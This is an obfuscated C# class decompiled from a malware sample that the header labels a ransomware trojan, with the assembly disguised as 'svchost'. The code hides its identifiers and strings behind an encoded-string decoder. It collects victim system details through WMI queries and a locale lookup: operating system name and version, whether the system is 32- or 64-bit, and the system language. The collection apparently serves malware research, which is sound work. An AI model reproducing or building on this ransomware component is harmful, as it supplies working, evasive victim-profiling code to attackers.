// Decompiled with JetBrains decompiler
// Type:  
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E45764DC-C7D2-4855-ACE6-36DDF2A7CE43
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00020-msil\HEUR-Trojan-Ransom.Win32.Generic-f28f43dd6beec5a1c2a6ba0f2239097a5536103540470e107799ada5d2c2b131.exe

using System;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

internal sealed class \u0002\u2001
{
  [DllImport("kernel32.dll")]
  private static extern int GetLocaleInfo(
    uint _param0,
    uint _param1,
    [Out] StringBuilder _param2,
    int _param3);

  public static string \u0002()
  {
    try
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0005\u2003.\u0002(1067756008));
      string str = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      {
        object propertyValue = managementBaseObject.GetPropertyValue(\u0005\u2003.\u0002(1067755997));
        if (propertyValue != null)
        {
          str = Regex.Replace(propertyValue.ToString(), \u0005\u2003.\u0002(1067755987), string.Empty);
          if (str.StartsWith(\u0005\u2003.\u0002(1067755071)))
          {
            str = str.Substring(9);
            str = str.Replace(\u0005\u2003.\u0002(1067755023), string.Empty);
            str = str.Split(' ')[1];
          }
        }
      }
      return str;
    }
    catch
    {
      return \u0005\u2003.\u0002(1067755011);
    }
  }

  public static string \u0003()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0005\u2003.\u0002(1067756008));
    string str1 = string.Empty;
    int num = 0;
    try
    {
      foreach (ManagementObject managementObject in managementObjectSearcher.Get())
      {
        object propertyValue1 = managementObject.GetPropertyValue(\u0005\u2003.\u0002(1067755997));
        if (propertyValue1 != null)
        {
          string str2 = Regex.Replace(propertyValue1.ToString(), \u0005\u2003.\u0002(1067755987), string.Empty);
          if (str2.StartsWith(\u0005\u2003.\u0002(1067755071)))
            str2 = str2.Substring(9);
          str1 = str2.Trim();
          if (!string.IsNullOrEmpty(str1))
          {
            try
            {
              object propertyValue2 = managementObject.GetPropertyValue(\u0005\u2003.\u0002(1067755029));
              if (propertyValue2 != null && propertyValue2.ToString() != \u0005\u2003.\u0002(1067755131))
                str1 = str1 + \u0005\u2003.\u0002(1067755123) + propertyValue2.ToString();
            }
            catch (Exception ex)
            {
            }
          }
          try
          {
            object propertyValue3 = managementObject.GetPropertyValue(\u0005\u2003.\u0002(1067755102));
            if (propertyValue3 != null)
              num = propertyValue3.ToString().Contains(\u0005\u2003.\u0002(1067755173)) ? 64 : 86;
          }
          catch (Exception ex)
          {
          }
        }
      }
    }
    catch (Exception ex)
    {
    }
    if (str1 == string.Empty)
      str1 = \u0005\u2003.\u0002(1067756166);
    if (num != 0)
      ;
    return str1 + \u0005\u2003.\u0002(1067755196) + num.ToString();
  }

  public static string \u0005()
  {
    StringBuilder stringBuilder = new StringBuilder(256);
    int localeInfo = \u0002\u2001.GetLocaleInfo(1024U, 7U, stringBuilder, stringBuilder.Capacity);
    return localeInfo > 0 ? stringBuilder.ToString().Substring(0, localeInfo - 1) : string.Empty;
  }

  public static string \u0008()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u0005\u2003.\u0002(1067755191));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
    {
      foreach (PropertyData property in managementBaseObject.Properties)
      {
        if (property.Name == \u0005\u2003.\u0002(1067755236))
          empty = property.Value.ToString();
      }
    }
    return empty;
  }
}
